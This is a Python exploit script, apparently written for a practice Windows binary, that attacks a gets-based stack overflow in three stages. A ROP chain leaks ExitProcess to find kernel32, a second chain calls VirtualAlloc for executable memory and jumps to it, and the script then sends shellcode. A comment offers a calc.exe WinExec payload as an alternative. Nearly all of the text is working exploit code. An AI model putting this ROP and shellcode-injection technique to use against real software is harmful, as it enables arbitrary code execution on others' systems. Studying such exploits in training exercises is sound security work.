#

from pwintools import *

retAddrOffs = 48

# gadgets
READ_AND_COMPARE = 0x140006FA0
PUTS_ILT = 0x1400021D0
GETS_ILT = 0x140003657
IMP_EXITPROCESS = 0x14008E000

DATA = 0x140084000
RDATA = 0x14006E000

POP_RBP = 0x140007b6d
POP_RCX = 0x140009016 # pop rcx; cld; ret;
POP_RDX_WARN = 0x14005ff79 # pop rdx; add cl, byte ptr [rbp - 0x75]; ret;

MOV_R8_RDX_WARN = 0x14000a6df # mov r8, rdx; mov qword ptr [rcx + 8], r8; mov rax, rcx; ret;
MOV_R9_RDX_WARN = 0x14005a7a3 # mov r9, rdx; mov r10, rcx; cmp r8d, dword ptr [rcx]; je 0x5a7b1; mov al, 1; ret;
MOV_P_RCX_RAX = 0x140041eff # mov qword ptr [rcx], rax; ret;
MOV_RCX_P_RBP_40 = 0x14006c59e # mov rcx, qword ptr [rbp + 0x40]; mov qword ptr [rax + 0x28], rcx; add rsp, 0x28; pop rbp; pop rbx; ret;

JMP_P_RCX = 0x1400660f3 # jmp qword ptr [rcx];

SKIP_SHADOW_STORE_PLUS_ONE = 0x00000001400072fb # add rsp, 0x28; ret;


# main

p = Process('1_gets_pw_vs_64.exe')
#p.set_timeout(3600000) # to have time to interact with the debugger

#input('press enter after attaching the debugger...')

# stage 1: leak ExitProcess address
ropchain1 = (
	p64(POP_RCX) +
	p64(IMP_EXITPROCESS) + # arg 1: resolved ExitProcess in .idata
	p64(PUTS_ILT) + # print it
	p64(READ_AND_COMPARE) # perform another bof again later
)

p.recvuntil(b'password:\r\n')

p.sendline(b'a'*(retAddrOffs-8) + p64(RDATA+0x75) + ropchain1)
leak = p.recvuntil(b'\r\n')

#print('got:', leak)

leak = leak[:-2][:8] # discard \r\n and extra bytes
#TODO read again if < 8 bytes!
leak = leak + b'\x00'*(8 - len(leak)) # pad with zeroes if fewer than 8 bytes

EXIT_PROCESS = u64(leak)
KERNEL32_BASE = EXIT_PROCESS - 0x1E0A0 # TODO multiversion support?
VIRTUAL_ALLOC = KERNEL32_BASE + 0x18500

#print('ExitProcess actual addres:', hex(EXIT_PROCESS))

# stage 2: allocate rwx memory, fill it and execute it
ropchain2 = (
	# VirtualAlloc(0, 1 page, usable, rwx)
	# 4th param
	p64(POP_RBP) + # to "fix" the warn for pop rdx
	p64(RDATA) +
	p64(POP_RCX) + # to "fix" the warn for mov r8/9, rdx
	p64(DATA) +
	p64(POP_RDX_WARN) +
	p64(0x40) + # PAGE_EXECUTE_READWRITE
	p64(MOV_R9_RDX_WARN) +
	
	# 3rd param
	p64(POP_RDX_WARN) +
	p64(0x3000) + # MEM_RESERVE | MEM_COMMIT
	p64(MOV_R8_RDX_WARN) +
	
	p64(POP_RDX_WARN) +
	p64(1337) + # size
	p64(POP_RCX) +
	p64(0) + # where
	
	p64(VIRTUAL_ALLOC) +
	
	p64(SKIP_SHADOW_STORE_PLUS_ONE) +
	
	p64(0xBaaaaaaaaaadBeef) + # shadow store
	p64(0xBaaaaaaaaaadBeef) + # shadow store
	p64(0xBaaaaaaaaaadBeef) + # shadow store
	p64(0xBaaaaaaaaaadBeef) + # shadow store
	p64(0xBaaaaaaaaaadCafe) + # junk
	
	# save new buffer
	p64(POP_RCX) +
	p64(DATA) +
	p64(MOV_P_RCX_RAX) +
	
	# gets(new buffer)
	p64(POP_RBP) +
	p64(DATA - 0x40) +
	p64(MOV_RCX_P_RBP_40) +
	p64(1234) + # junk
	p64(1234) + # junk
	p64(1234) + # junk
	p64(1234) + # junk
	p64(1234) + # junk
	p64(1234) + # junk
	p64(1234) + # junk
	p64(GETS_ILT) +
	
	p64(SKIP_SHADOW_STORE_PLUS_ONE) +
	p64(1234) + # shadow store
	p64(1234) + # shadow store
	p64(1234) + # shadow store
	p64(1234) + # shadow store
	p64(1234) + # junk
	
	# execute injected code
	p64(POP_RCX) +
	p64(DATA) +
	p64(JMP_P_RCX)
)
p.sendline(b'a'*retAddrOffs + ropchain2)

# stage 3: actual write in rwx memory
f = open('TMP64', 'rb')
shellcode = f.read()
f.close()

# this works aswell:
# shellcode = shellcraft.amd64.WinExec(r'C:\WINDOWS\system32\calc.exe')

p.sendline(shellcode)

#p.interactive()

print(p.recvall())
